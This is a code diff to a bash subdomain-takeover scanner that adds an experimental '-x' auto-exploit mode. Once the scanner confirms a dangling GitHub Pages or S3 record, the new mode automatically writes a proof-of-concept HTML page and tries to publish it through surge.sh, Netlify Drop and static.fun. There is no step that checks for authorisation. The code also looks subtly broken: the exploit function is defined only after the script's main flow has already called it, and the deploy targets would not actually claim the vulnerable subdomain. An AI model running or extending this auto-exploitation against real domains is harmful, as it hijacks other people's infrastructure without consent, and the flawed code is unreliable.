@@ -40,15 +40,38 @@ declare -A FINGERPRINTS=(
 
 SILENT=false
 
+AUTO_EXPLOIT=false
+SURGE_DOMAIN="surge.sh"
+NETLIFY_DROP="https://app.netlify.com/drop"
+VERCEL_DEPLOY="https://vercel.com/new"
+
+EXPLOIT_TEMPLATE='<!DOCTYPE html>
+<html>
+<head>
+    <title>Subdomain Takeover PoC</title>
+    <meta property="og:title" content="Security Notice">
+    <meta property="og:description" content="This domain was vulnerable to takeover">
+    <meta property="og:description" content="cc: @1hehaq">
+</head>
+<body>
+    <h1>Subdomain Takeover Proof of Concept</h1>
+    <p>This domain was vulnerable to subdomain takeover.</p>
+    <p>Identified using conquer tool by @1hehaq</p>
+    <p>Hello team, this is a security research proof of concept. Please fix this issue.</p>
+    <hr>
+    <small>This is a security research proof of concept. Please contact the domain owner.</small>
+</body>
+</html>'
+
 check_deps() {
     command -v dig >/dev/null 2>&1 || { echo "Error: dig is required but not installed."; exit 1; }
     command -v curl >/dev/null 2>&1 || { echo "Error: curl is required but not installed."; exit 1; }
     if [ -n "$threads" ] && ! command -v parallel >/dev/null 2>&1; then
-        echo -e "${YELLOW}[WARNING]${NC} GNU Parallel not installed. Install it for faster scanning:"
+        echo -e "${YELLOW}[WARNING]${NC} GNU parallel not installed. Install it for faster scanning:"
         echo "Ubuntu/Debian: sudo apt install parallel"
         echo "CentOS/RHEL: sudo yum install parallel"
         echo "macOS: brew install parallel"
-        echo -e "\nContinuing without parallel processing..."
+        echo -e "${GREY}\ncontinuing without parallel processing!\n${NC}"
     fi
 }
 
@@ -59,6 +82,7 @@ usage() {
     echo "  -o    Output file (optional)"
     echo "  -t    Number of threads (default: 10)"
     echo "  -s    Silent mode (only show vulnerable/not vulnerable)"
+    echo "  -x    Auto-exploit confirmed takeovers (experimental)"
     exit 1
 }
 
@@ -107,6 +131,7 @@ verify_takeover() {
             repo_name=$(echo "$cname" | cut -d'.' -f1)
             gh_check=$(curl -s "https://api.github.com/repos/$repo_name" 2>/dev/null)
             if echo "$gh_check" | grep -q "Not Found"; then
+                [ "$AUTO_EXPLOIT" = true ] && exploit_takeover "$subdomain" "$service"
                 return 0
             fi
             ;;
@@ -114,6 +139,7 @@ verify_takeover() {
             bucket_name=$(echo "$cname" | cut -d'.' -f1)
             aws_check=$(curl -s "http://${bucket_name}.s3.amazonaws.com" 2>/dev/null)
             if echo "$aws_check" | grep -q "NoSuchBucket"; then
+                [ "$AUTO_EXPLOIT" = true ] && exploit_takeover "$subdomain" "$service"
                 return 0
             fi
             ;;
@@ -191,13 +217,14 @@ cleanup() {
 
 trap cleanup SIGINT SIGTERM EXIT
 
-while getopts "d:l:o:t:hs" opt; do
+while getopts "d:l:o:t:hsx" opt; do
     case $opt in
         d) domain="$OPTARG" ;;
         l) subdomain_list="$OPTARG" ;;
         o) output_file="$OPTARG" ;;
         t) threads="$OPTARG" ;;
         s) SILENT=true ;;
+        x) AUTO_EXPLOIT=true ;;
         h) usage ;;
         *) usage ;;
     esac
@@ -269,3 +296,53 @@ fi
 if [ -n "$output_file" ]; then
     echo "Results saved to $output_file"
 fi 
+
+exploit_takeover() {
+    local subdomain=$1
+    local service=$2
+    local success=false
+    local tmp_dir=$(mktemp -d)
+    
+    echo "$EXPLOIT_TEMPLATE" > "$tmp_dir/index.html"
+    
+    case $service in
+        "GitHub Pages"|"Netlify"|"Vercel"|"Heroku"|"AWS/S3")
+            # try surge.sh
+            if command -v surge &>/dev/null; then
+                if surge "$tmp_dir" "https://$subdomain.$SURGE_DOMAIN" --no-prompt &>/dev/null; then
+                    success=true
+                    echo -e "${GREEN}[EXPLOITED]${NC} Deployed to https://$subdomain.$SURGE_DOMAIN"
+                fi
+            fi
+            
+            # try netlify.com
+            if [ "$success" = false ]; then
+                if curl -s -X POST -F "file=@$tmp_dir/index.html" \
+                    -F "title=Security PoC" \
+                    "$NETLIFY_DROP" &>/dev/null; then
+                    success=true
+                    echo -e "${GREEN}[EXPLOITED]${NC} Deployed to Netlify Drop"
+                fi
+            fi
+            
+            # try static.fun
+            if [ "$success" = false ]; then
+                if curl -s -X PUT -d "@$tmp_dir/index.html" \
+                    "https://static.fun/$subdomain/index.html" &>/dev/null; then
+                    success=true
+                    echo -e "${GREEN}[EXPLOITED]${NC} Deployed to https://static.fun/$subdomain"
+                fi
+            fi
+            ;;
+    esac
+    
+    rm -rf "$tmp_dir"
+    
+    if [ "$success" = true ]; then
+        if [ -n "$output_file" ]; then
+            echo "[EXPLOITED] $subdomain - PoC deployed" >> "$output_file"
+        fi
+        return 0
+    fi
+    return 1
+} 
